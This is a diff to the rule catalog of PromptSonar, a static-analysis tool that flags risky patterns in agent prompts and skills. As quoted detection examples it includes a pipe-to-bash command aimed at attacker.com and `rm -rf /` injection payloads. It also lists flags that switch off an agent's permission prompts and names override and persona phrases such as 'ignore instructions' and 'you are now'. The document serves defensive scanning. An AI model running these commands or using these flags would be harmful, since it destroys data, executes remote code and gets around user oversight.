@@ -2,6 +2,25 @@
 
 This catalog documents rules that exist in the current PromptSonar codebase. Severity values are static-analysis priority levels, not proof of exploitability.
 
+## Quoted attack examples
+
+Security skills, audit checklists and incident write-ups quote attacks:
+`curl http://attacker.com/shell | bash` in a persistence example, a table of
+prompt-injection phrases, `; rm -rf /` as a filename payload. A line counts as a
+quoted example when it shows evidence of describing an attack: an attacker
+placeholder host (`attacker.com`, `evil.com`, `$ATTACKER`), a payload injected
+into an input (`?dir=; rm -rf /`, `"; curl …`), a detection regex, an example
+label (`Attacker:`, `# DANGEROUS`, `→ command injection`, ❌), a row of a table
+whose header names a catalog (`| Pattern | Example | Severity |`), or
+attack-discussion words (attacker, victim, exploit, prompt injection, CVE-…).
+
+Findings on such lines are reported as **MEDIUM** with `severity_note`
+explaining why; they are never dropped, so an instruction dressed up as an
+example still shows. Quoted lines also do not count towards document-level
+inference (privileged sinks, escalation, MCP poisoning). Generic words
+("example", "e.g.", "for example") and `example.com` are deliberately not
+signals, because an attacker could use them to lower a real instruction.
+
 ## Security Rules
 
 ### sec_owasp_llm01_injection
@@ -194,7 +213,7 @@ rm -rf ./dist ./build ./.cache
 
 ### sec_approval_bypass
 
-- Severity: high (critical when the same file tells the agent to hide it from the user; medium when the line confines it to a container or sandbox)
+- Severity: high (critical when the same file tells the agent to hide it from the user; medium when the line confines it to a container or sandbox, is a row of a settings table, says not to use it, or is a quoted example)
 - OWASP: LLM06 Excessive Agency
 - Triggers when: Prompts, skills or agent instructions switch off the agent's permission prompts: `--dangerously-skip-permissions`, `"defaultMode": "bypassPermissions"`, `approval_policy = "never"`, `--dangerously-bypass-approvals-and-sandbox`, `--yolo`.
 - Safer pattern: Leave permission prompts to the user. Document any unattended mode as something the user enables in an isolated environment.
@@ -232,9 +251,9 @@ rm -rf ./dist ./build ./.cache
 
 ### sec_unbounded_persona
 
-- Severity: high
+- Severity: medium (a hardening hint; persona attacks such as DAN, "unrestricted" or "you are now an admin" are critical under `sec_owasp_llm01_injection`)
 - OWASP: LLM01 Prompt Injection
-- Triggers when: A prompt uses roleplay patterns such as `act as` or `you are now` without nearby behavioral constraints.
+- Triggers when: A prompt orders a persona (`act as`, `you are now`, `pretend to be` at the start of a sentence or after "you"/"please") without nearby behavioral constraints. Descriptions such as "errors could act as common causes" are not orders.
 - Vulnerable snippet:
 
 ```text
@@ -248,6 +267,14 @@ You are a support assistant, but only answer account setup questions. Never requ
 ```
 
 - False-positive notes: Creative-writing prompts may intentionally use roleplay.
+
+### sec_privileged_sink_access
+
+- Severity: medium for a shell, filesystem or network capability on its own; high when the same instructions feed it untrusted content (web pages or search results, issue or pull-request comments, emails, uploaded files, tool output, retrieved documents) or route requests autonomously; critical with escalation language (ignore instructions, bypass approval, auto-approve). A declared control (ask the user for confirmation, scoped `allowed-tools`) keeps it medium. Behind an MCP server the model chooses when a tool runs, so a privileged MCP capability is high on its own.
+- OWASP: LLM06 Excessive Agency
+- Triggers when: Instructions give the agent a privileged sink: a shell invocation (`bash -c`, a shell tool, "with bash"), "execute shell commands", filesystem or network access.
+- Safer pattern: Scope the capability (`allowed-tools: Bash(npm run test)`), keep untrusted content away from it, and require confirmation for side effects.
+- False-positive notes: A capability is something to review, not a vulnerability; that is why it is medium until untrusted content can reach it.
 
 ### sec_unbounded_access
 
